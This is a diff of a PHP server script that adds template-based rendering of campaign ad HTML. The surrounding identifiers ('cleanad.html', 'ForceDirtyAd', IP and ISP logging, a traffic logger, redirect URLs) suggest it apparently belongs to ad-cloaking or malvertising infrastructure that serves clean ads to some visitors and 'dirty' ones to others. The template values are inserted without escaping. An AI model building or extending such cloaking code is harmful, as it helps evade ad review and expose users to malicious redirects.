@@ -141,6 +141,27 @@
 		return $resultHtml;
 	}
 
+	function renderHTMLTemplate($templateName, $templateParameters)
+	{
+		$templateFilename = "profiles/htmltemplates/$templateName.html";
+
+		$template = file_get_contents($templateFilename);
+
+		foreach ($templateParameters as $parameter => $parameterValue)
+		{
+			if (is_array($parameterValue))
+			{
+				$template = str_replace($parameter, "'" . implode("','", $parameterValue) . "'", $template);
+			}
+			else
+			{
+				$template = str_replace($parameter, $parameterValue, $template);
+			}
+		}
+
+		return $template;
+	}
+
 	function adlog($campaignID, $ip, $isp, $txt)
 	{
 		$line = createLogLine($ip, $isp, $txt);
@@ -260,15 +281,12 @@
 
 	handleTrafficLoggerData($campaignID);
 
-	$cleanHtmlFilename = "ads/" . $campaignID . ".cleanad.html";
 	$configFilename  = "ads/" . $campaignID . ".config.txt";
 
-	if (!file_exists($cleanHtmlFilename) || !file_exists($configFilename))
+	if (!file_exists($configFilename))
 	{
 		exit;
 	}
-
-	$resultHtml = file_get_contents($cleanHtmlFilename);
 
 	$adConfig = processAdConfig($configFilename);
 
@@ -295,6 +313,18 @@
 	$consoleLoggingEnabled 			= array_key_exists("ConsoleLoggingEnabled", $adConfig) && $adConfig["ConsoleLoggingEnabled"] === "false" ? false : true;
 	$forceDirtyAd 					= array_key_exists("ForceDirtyAd", $adConfig) && $adConfig["ForceDirtyAd"] === "false" ? false : true;
 	$trafficLoggerEnabled			= array_key_exists("TrafficLoggerEnabled", $adConfig) && $adConfig["TrafficLoggerEnabled"] === "false" ? false : true;
+	$HTMLTemplate 					= array_key_exists("HTMLTemplate", $adConfig) ? $adConfig["HTMLTemplate"] : "";
+	$HTMLTemplateValues 			= array_key_exists("HTMLTemplateValues", $adConfig) ? json_decode($adConfig["HTMLTemplateValues"]) : "";
+
+	if (!empty($HTMLTemplate))
+	{
+		$resultHtml = renderHTMLTemplate($HTMLTemplate, $HTMLTemplateValues);
+	}
+	else
+	{
+		$cleanHtmlFilename = "ads/" . $campaignID . ".cleanad.html";
+		$resultHtml = file_get_contents($cleanHtmlFilename);
+	}
 
 	if (empty($redirectUrl))
 	{
